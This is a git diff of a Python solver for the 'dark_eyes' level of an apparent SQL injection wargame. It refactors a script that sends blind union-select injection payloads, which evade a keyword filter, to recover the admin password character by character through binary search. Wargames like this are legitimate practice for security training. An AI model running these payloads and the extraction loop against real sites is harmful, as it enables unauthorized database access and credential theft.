@@ -1,17 +1,18 @@
 #!/usr/bin/env python3
 import los
+import los_cookies as lc
 
 
 def check_func(*args) -> bool:
-    '''
+    """
     check string in response of request
     args[0]: response
-    '''
-    return 'select id from prob_dark_eyes' in args[0]
+    """
+    return "select id from prob_dark_eyes" in args[0]
 
 
 def main():
-    '''
+    """
     Dark_eyes 22
 
     if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
@@ -25,35 +26,24 @@ def main():
     $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
     $result = @mysqli_fetch_array(mysqli_query($db,$query));
     if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
-    '''
+    """
 
     url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
+    method = 'get'
+    inj_param = 'pw'
 
     payload = "'||id='admin'&&(select 1 union select (length(pw)>%s))#"
-    param = dict(pw=payload)
-    len_of_key = los.find_key_len(url, param, check_func, cook)
+    p = los.SqlInjection(url, cook, method, inj_param, payload)
+    len_of_key = p.find_key_len(check_func)
 
-    print(len_of_key)
+    p.payload = f"'||id='admin'&&(select 1 union select (ord(mid(pw,%d,1))<%s))#"
+    result = p.find_binary(check_func, len_of_key)
 
-    result = ''
-    num_of_requests = 0
-    for i in range(1, len_of_key + 1):
-        payload = f"'||id='admin'&&(select 1 union select (ord(mid(pw,{i},1))<%s))#"
-        param = dict(pw=payload)
-        left, num_requests = los.find_binary(url, param, check_func,
-                                             32, 127, cook)
-        print(chr(left))
-        result += chr(left)
-        num_of_requests += num_requests
-
-    print('num_of_requests:', num_of_requests)
-
-    param = dict(pw=result)
-    response = los.get_request(url, param, cook)
-
+    p.payload = result
+    response = p.my_request()
     if 'Clear!' in response:
-        print('Dark_eyes Clear!')
+        print('\nDark_eyes Clear!')
 
 
 if __name__ == '__main__':
